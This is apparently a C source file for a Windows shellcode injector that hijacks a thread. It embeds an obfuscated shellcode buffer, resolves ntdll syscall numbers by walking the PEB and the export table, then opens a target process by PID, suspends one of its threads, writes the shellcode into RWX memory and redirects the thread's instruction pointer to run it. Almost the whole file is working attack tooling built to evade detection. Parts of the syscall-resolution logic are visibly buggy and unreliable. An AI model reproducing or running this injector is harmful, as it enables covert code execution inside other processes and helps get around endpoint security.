#include <stdio.h>
#include "syscall.h"
#include "main.h"


#pragma comment(lib, "shlwapi.lib")
#define g(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define e(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define i(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
#define STATUS_SUCCESS 0x00000000
#define TH32CS_SNAPPROCESS 0x00000002
#define TH32CS_SNAPTHREAD



// CREATE_NO_WINDOW already defined in winbase.h

//#define PAGE_READWRITE 0x04
//#define MEM_COMMIT 0x00001000
//#define MEM_RESERVE 0x00002000

unsigned char buf[] =
"\xeb\x27\x5b\x53\x5f\xb0\xea\xfc\xae\x75\xfd\x57\x59\x53"
"\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
"\xb8\x43\x74\x07\x80\x3e\xea\x75\xea\xeb\xe6\xff\xe1\xe8"
"\xd4\xff\xff\xff\x14\x01\xea\xff\x26\x4f\x52\x4b\xb1\x4d"
"\xfd\xba\x74\xe9\x56\x4d\x52\x4a\x8b\x12\x31\x13\x49\xeb"
"\xc6\x5c\xfe\xd2\x67\x95\x3e\x26\xfd\x60\x06\x94\x3f\x4d"
"\x74\xfe\xea\xf2\xfe\xf5\xe9\xc0\xfe\xeb\xfe\x15\x15\x4d"
"\xeb\x27\x5b\x53\x5f\xb0\x5c\xfc\xae\x75\xfd\x57\x59\x53"
"\x5e\x8a\x06\x30\x07\x48\xff\xc7\x48\xff\xc6\x66\x81\x3f"
"\xe6\x5d\x74\x07\x80\x3e\x5c\x75\xea\xeb\xe6\xff\xe1\xe8"
"\xd4\xff\xff\xff\x14\x01\x5c\xff\x26\x4f\x52\x4b\xb1\xf6"
"\xfd\xba\x74\xe9\x56\x4d\x52\x4a\x8b\x12\x31\x13\x49\xeb"
"\xc6\x5c\xfe\xd2\x67\x95\x3e\x41\x75\x60\x06\x94\x3f\xf6"
"\x74\xfe\xea\xf2\xfe\xf5\xe9\xc0\xfe\xeb\xfe\x58\xe3\xb3"
"\x6a\x03\x1e\x07\xfd\x59\xb1\xf6\x38\xa5\x1a\x01\x1e\x06"
"\xc7\x5e\x7d\x5f\x05\xa7\x8a\x10\xb2\x9e\x2b\xd9\x72\x9e"
"\x55\x2c\x4a\xd8\x73\x59\x38\xb2\xa6\xbe\xb2\xb9\xa5\x8c"
"\xb2\xa7\xb2\xd6\x4c\x3d\xe4\x8d\x90\x89\x73\xd8\x3f\x78"
"\xb6\x2b\x94\x8f\x90\x88\x49\xd0\xf3\xd1\x8b\x29\x04\x9e"
"\x3c\x10\xa5\x57\xfc\x12\xb6\xa2\xc4\x56\xfd\xd8\xb6\x3c"
"\x28\x30\x3c\x37\x2b\x02\x3c\x29\x3c\x8e\xcd\x65\xbc\xd5"
"\xc8\xd1\x2b\x81\x67\x20\xee\x73\xcc\xd7\xc8\xd0\x11\x88"
"\xab\x89\xd3\x71\x5c\xc6\x64\x48\xfd\x0f\xa4\xf9\x43\xfa"
"\x9c\x0e\xa5\x81\xee\x64\x70\x68\x64\x6f\x73\x5a\x64\x71"
"\x64\x96\x94\x7d\xa4\xcd\xd0\xc9\x33\x89\x7f\x38\xf6\x6b"
"\xd4\xcf\xd0\xc8\x09\x90\xb3\x91\xcb\x69\x44\xde\x7c\x50"
"\xe5\x17\xbc\xab\x74\xe2\x84\x16\xbd\x89\xf6\x7c\x68\x70"
"\x7c\x77\x6b\x42\x7c\x69\x7c\xb5\x9c\x5e\x87\xee\xf3\xea"
"\x10\x40\x5c\x1b\xd5\x48\xf7\xec\xf3\xeb\x2a\xb3\x90\xb2"
"\xe8\x4a\x67\xfd\x5f\x73\xc6\x34\x9f\xba\x3d\xc1\xa7\x35"
"\x9e\x40\xd5\x5f\x4b\x53\x5f\x54\x48\x61\x5f\x4a\x5f\xb6"
"\x55\x5d\x84\xed\xf0\xe9\x13\x01\x5f\x18\xd6\x4b\xf4\xef"
"\xf0\xe8\x29\xb0\x93\xb1\xeb\x49\x64\xfe\x5c\x70\xc5\x37"
"\x9c\x98\x39\xc2\xa4\x36\x9d\x01\xd6\x5c\x48\x50\x5c\x57"
"\x4b\x62\x5c\x49\x5c\xa6\x14\x5a\xfb\x27\x57\x56\x4c\x59"
"\x4c\x4e\x7f\xa6\xb3\xa6\xf2\xf7\xf2\xf6\xe1\xee\x82\x74"
"\xd6\xee\x38\xf4\xd3\xee\x38\xf4\xab\xee\x38\xf4\x93\xf7"
"\xe5\xee\xbc\x11\xf9\xec\xfe\x97\x7a\xee\x38\xd4\xe3\xee"
"\x82\x66\x1f\x9a\xd2\xda\xb1\x8a\x93\xe7\x72\x6f\xbe\xe7"
"\xb2\x67\x51\x4b\xe1\xee\x38\xf4\x93\xe7\xe2\x2d\xf1\x9a"
"\xfb\xa7\x63\xc0\x32\xde\xab\xad\xb1\xa9\x36\xd4\xb3\xa6"
"\xb3\x2d\x33\x2e\xb3\xa6\xb3\xee\x36\x66\xc7\xc1\xfb\xa7"
"\x63\xf6\x38\xee\xab\xe2\x38\xe6\x93\xef\xb2\x76\x50\xf0"
"\xfb\x59\x7a\xeb\x82\x6f\xf2\x2d\x87\x2e\xfb\xa7\x65\xee"
"\x82\x66\x1f\xe7\x72\x6f\xbe\xe7\xb2\x67\x8b\x46\xc6\x57"
"\xff\xa5\xff\x82\xbb\xe3\x8a\x77\xc6\x7e\xeb\xe2\x38\xe6"
"\x97\xef\xb2\x76\xd5\xe7\x38\xaa\xfb\xe2\x38\xe6\xaf\xef"
"\xb2\x76\xf2\x2d\xb7\x2e\xf2\xfe\xfb\xa7\x63\xe7\xeb\xf8"
"\xea\xfc\xf2\xfe\xf2\xff\xf2\xfc\xfb\x25\x5f\x86\xf2\xf4"
"\x4c\x46\xeb\xe7\xea\xfc\xfb\x2d\xa1\x4f\xf8\x59\x4c\x59"
"\xee\x4e\xb8\xa6\xb3\xa6\xc6\xd5\xd6\xd4\x80\x94\x9d\xc2"
"\xdf\xca\xb3\xff\xf2\x1c\xff\xd1\x95\xa1\x4c\x73\xfa\x61"
"\x72\xa6\xb3\xa6\xb3\x4e\xb5\xa6\xb3\xa6\xdb\xc3\xdf\xca"
"\xdc\xa6\xe9\x4e\xb5\xa6\xb3\xa6\xdb\xc3\xdf\xca\xdc\xa6"
"\xf2\xfe\xfb\x97\x7a\xe7\x09\xe3\x30\xf0\xb4\x59\x66\xee"
"\x82\x6f\xf2\x1c\x43\x13\x11\xf0\x4c\x73\x8d\x2c\xaf\x28"
"\xbe\x61\xec\x56\x07\xa3\x8b\x40\x54\x60\xe6\x5d\x33\xe8"
"\xb8\x43";


char sort(const void* n1, const void* n2) {

	return(*(char*)n1 - *(char*)n2);
}

size_t GetModHandle(wchar_t* ln) {
	PEB* pPeb = (PEB*)__readgsqword(0x60);
	PLIST_ENTRY header = &(pPeb->Ldr->InMemoryOrderModuleList);
	i("%p\n", pPeb);
	i("%p\n", header);



	for (PLIST_ENTRY curr = header->Flink; curr != header; curr = curr->Flink) {
		i("%p", curr);
		LDR_DATA_TABLE_ENTRY* data = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		i("current node is: %ls\n", data->FullDllName.Buffer);

		if (StrStrIW(ln, data->FullDllName.Buffer)) {
			e("%ls is a match to %ls.", data->FullDllName.Buffer, ln);

			return (size_t)data->DllBase;
		}
		else {
			e("%ls is not a match to %ls\n", data->FullDllName.Buffer, ln);
		}


	}
	e("returning NULL value, failed to get dll");
	return 0;

}

DWORD GetFuncAddr(size_t modb, char* fn) {



	int nindex = 0;
	int cnt = 0;
	PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)(modb);
	PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(modb + dosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER opH = ntHdr->OptionalHeader;
	IMAGE_DATA_DIRECTORY data_Dir = opH.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

	PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(modb + data_Dir.VirtualAddress);

	i("Export Table: %p\n", exportTable);
	DWORD* arrf = (DWORD*)(modb + exportTable->AddressOfFunctions);
	DWORD* arrn = (DWORD*)(modb + exportTable->AddressOfNames);
	WORD* arrno = (WORD*)(modb + exportTable->AddressOfNameOrdinals);

	for (size_t k = 0; k < exportTable->NumberOfNames; k++) {
		char* name = (char*)(modb + arrn[k]);

		WORD ordinalIndex = arrno[k];
	

		if (name[0] == 'N' && name[1] == 't') {
			
			cnt++;
		}
		
		else if (name[0] == 'P' && name[1] == 'f' && name[2] == 'x') {

			break;
		}
			

		i("cnt is %d\n", cnt);


	}


	char* ptr;

	i("dynamically allocating for ptr length of %d", cnt * sizeof(char*));

	ptr = (char*)malloc(cnt*sizeof(char*));
	i("size of ptr is %d\n", sizeof(ptr));

	i("allocated memory for %d names\n", cnt);
	i("pointer address is %p\n", ptr);

	
	for (size_t i = 0; i < exportTable->NumberOfNames; i++) {
		char* name = (char*)(modb + arrn[i]);

		WORD ordinalIndex = arrno[i];
		//i("Checking function: %s (ordinal index: %d)", name, ordinalIndex);

		if (!stricmp(name, fn)) {
			g("Found function %s at ordinal index %d", name, ordinalIndex);
			size_t funcAddr = modb + arrf[ordinalIndex];
			g("Function address: 0x%p", funcAddr);
		}


		if (name[0] == 'N' && name[1] == 't') {
			//g("Found function %s at ordinal index %d", name, ordinalIndex);
			//size_t funcAddr = modb + arrf[ordinalIndex];
			//g("Function address: 0x%p", funcAddr);
			// unsigned char* stubBytes[] = { 0x4C,  0x8B, 0xD1, 0xB8 };
			//DWORD ssn = (unsigned char*)(funcAddr + 4)[0]
			
			ptr[nindex] = name;
			nindex++;
			if (ptr == NULL) {
				i("pointer is null, breaking");
				break;
			}
		}
		else if (name[0] == 'P' && name[1] == 'f' && name[2] == 'x') {

			break;
		}

		



	}



	i("number of nt functions: %d\n", nindex);
	i("getting n values\n");
	i("size of ptr is %d\n", sizeof(ptr));
	int n = sizeof(ptr) / sizeof(ptr[0]);
	qsort(ptr, n, sizeof(ptr), sort);

	for (size_t j = 0; j < sizeof(ptr);j++) {

		i("comparing to %s\n", fn);

		if (ptr[j] == fn) {
			i("ssn is %d", j + 4);
			return((DWORD)j+4);
		}
		else{
			e("not a match");
		}
		
	}
	


}


	int main(int argc, char* argv[]) {

		if (argc < 3) {
			e("Usage: %s <pid> <tid>", argv[0]);
			return 1;
		}

		int pid = atoi(argv[1]);
		int tid = atoi(argv[2]);
		DWORD procid = (DWORD)pid;
		DWORD threadid = (DWORD)tid;

		size_t kb = GetModHandle(L"C:\\WINDOWS\\System32\\ntdll.dll");

		 wrdNtOpenThread = (DWORD)GetFuncAddr(kb, "NtOpenThread");
		 wrdNtOpenProcess = (DWORD)GetFuncAddr(kb, "NtOpenProcess");
		 wrdNtSuspendThread = (DWORD)GetFuncAddr(kb, "NtSuspendThread");
		 wrdNtGetContextThread = (DWORD)GetFuncAddr(kb, "NtGetContextThread");
		 wrdNtAllocateVirtualMemory = (DWORD)GetFuncAddr(kb, "NtAllocateVirtualMemory");
		 wrdNtWriteVirtualMemory = (DWORD)GetFuncAddr(kb, "NtWriteVirtualMemory");
		 wrdNtSetContextThread = (DWORD)GetFuncAddr(kb, "NtSetContextThread");
		 wrdNtResumeThread = (DWORD)GetFuncAddr(kb, "NtResumeThread");

		


		NTSTATUS status;

		STARTUPINFOW si = { .cb = sizeof(STARTUPINFOW) };
		CLIENT_ID cid_proc = { (HANDLE)(ULONG_PTR)procid, NULL };
		CLIENT_ID cid_thread = { (HANDLE)(ULONG_PTR)procid, (HANDLE)(ULONG_PTR)threadid };
		i("target pid: %d, tid: %d", procid, threadid);
		i("pid read in: %d", cid_proc.UniqueProcess);

		OBJECT_ATTRIBUTES oa;
		InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

		PVOID baseAddress = NULL;
		PROCESS_INFORMATION pi;
		CONTEXT CTX = { .ContextFlags = (CONTEXT_CONTROL | CONTEXT_SEGMENTS | CONTEXT_INTEGER) };

		SIZE_T sz = sizeof(buf);
		g("size of shellcode: %d", sz);

		HANDLE hProc;
		HANDLE hThread;

		i("NtOpenProcess IS: 0x%x", wrdNtOpenProcess);
		i("passing in:\n - handle:0x%x\n - mask: 0x%x\n - object attributes: 0x%p\n - cid: 0x%p\n", &hProc, PROCESS_ALL_ACCESS, &oa, &cid_proc);

		status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &oa, &cid_proc);

		if (status == STATUS_SUCCESS) { g("proc opened"); }
		else { e("proc not open, 0x%08X", status); return 1; }


		status = NtOpenThread(&hThread, THREAD_ALL_ACCESS, &oa, &cid_thread);

		if (status == STATUS_SUCCESS) { g("thread opened"); }
		else { e("thread not open, 0x%08X", status); return 1; }

		status = NtSuspendThread(hThread, NULL);

		if (status == STATUS_SUCCESS) { g("thread suspended"); }
		else { e("thread not sus, 0x%08X", status); return 1; }

		status = NtGetContextThread(hThread, &CTX);

		if (status == STATUS_SUCCESS) { g("got ctx thread at: %p", CTX); }
		else { e("did not get ctx thread, 0x%08X", status); return 1; }

		status = NtAllocateVirtualMemory(hProc, &baseAddress, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if (status == STATUS_SUCCESS) { g("allocated memory at: %p", baseAddress); }
		else { e("failed to allocate memory, 0x%08X", status); return 1; }


		status = NtWriteVirtualMemory(hProc, baseAddress, buf, sizeof(buf), NULL);
		if (status == STATUS_SUCCESS) {
			g("wrote memory at: %p", baseAddress);
		}
		else { e("did not write, %08X", status); return 1; }

		CTX.Rip = (DWORD64)baseAddress;

		status = NtSetContextThread(hThread, &CTX);
		if (status == STATUS_SUCCESS) { g("set thread ctxy"); }
		else { e("did not set , 0x%08X", status); return 1; }

		status = NtResumeThread(hThread, NULL);

		if (status == STATUS_SUCCESS) { g("resumed"); }
		else { e("did not resume, 0x%08X", status); return 1; }


		return 0;

	}





